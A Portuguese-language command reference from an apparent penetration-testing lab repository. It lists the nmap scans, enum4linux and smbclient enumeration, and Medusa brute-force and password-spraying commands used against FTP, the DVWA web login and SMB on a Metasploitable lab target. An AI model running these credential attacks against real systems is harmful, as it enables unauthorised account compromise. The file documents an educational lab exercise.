# 📘 Commands — Kali Medusa Brute Force Lab

Este documento reúne todos os comandos utilizados ao longo do laboratório, organizados por etapas.  
Serve como referência rápida e documentação técnica dentro do repositório.

---

# 🧭 1. Verificação de IP e Rede

### Listar interfaces e IP da máquina
```bash
ip a
````

### Testar conectividade com o alvo

```bash
ping <TARGET_IP>
```

---

# 🔍 2. Enumeração Inicial — Nmap

### Varredura completa (todas as portas)

```bash
nmap -sS -sV -O -p- <TARGET_IP> -oN evidence/nmap_full.txt
```

* `-sS` → SYN Scan
* `-sV` → Versão do serviço
* `-O` → Detecção de sistema
* `-p-` → Todas as portas
* `-oN` → Salvar saída em arquivo

---

# 📁 3. Wordlists utilizadas

### Wordlist simples para testes rápidos

```
wordlists/small-passwords.txt
```

### Wordlist ampliada para ataques SMB

```
wordlists/common-passwords.txt
```

### Wordlist de usuários extraídos/estimados

```
wordlists/users.txt
```

---

# 🔐 4. Ataque FTP — Medusa

### Brute force no serviço FTP

```bash
medusa -h <TARGET_IP> \
       -u ftp \
       -P wordlists/small-passwords.txt \
       -M ftp -f \
       -O evidence/ftp_medusa_output.txt
```

---

# 🌐 5. Ataque Web (DVWA) — Medusa HTTP

> O DVWA utiliza token anti-CSRF; por isso, o ataque foi feito usando o módulo HTTP genérico.

### Brute force via módulo HTTP

```bash
medusa -h <TARGET_IP> \
       -u admin \
       -P wordlists/small-passwords.txt \
       -M http \
       -m DIR:/dvwa/ \
       -O evidence/dvwa_http_output.txt
```

---

# 📦 6. Enumeração SMB

### Descoberta de compartilhamentos e usuários

```bash
enum4linux -a <TARGET_IP> | tee evidence/enum4linux_output.txt
```

### Testar SMB com sessão anônima

```bash
smbclient -L <TARGET_IP> -N
```

---

# 💥 7. Password Spraying SMB — Medusa

### Ataque SMB com wordlists completas

```bash
medusa -h <TARGET_IP> \
       -U wordlists/users.txt \
       -P wordlists/common-passwords.txt \
       -M smbnt \
       -m DOMAIN:WORKGROUP \
       -f \
       -O evidence/smb_medusa_output.txt
```

### Ataque por usuário específico (opcional)

```bash
medusa -h <TARGET_IP> -u <USER> -P wordlists/common-passwords.txt -M smbnt -f
```

---

# 🗂️ 8. Ferramentas Adicionais

### Serviços ativos no Metasploitable

```bash
netstat -tulpn
```

### Reiniciar serviços no Metasploitable

```bash
sudo service apache2 start
sudo service vsftpd start
sudo service samba start
```

---

# 🧹 9. Git — Versionamento das Evidências

### Adicionar arquivos

```bash
git add .
```

### Commit

```bash
git commit -m "Add evidence and tests"
```

### Enviar para o GitHub

```bash
git push
```

---

# 🏁 Fim

Este documento resume todos os passos executados no projeto.
Use como consulta rápida ou como base para estudos futuros.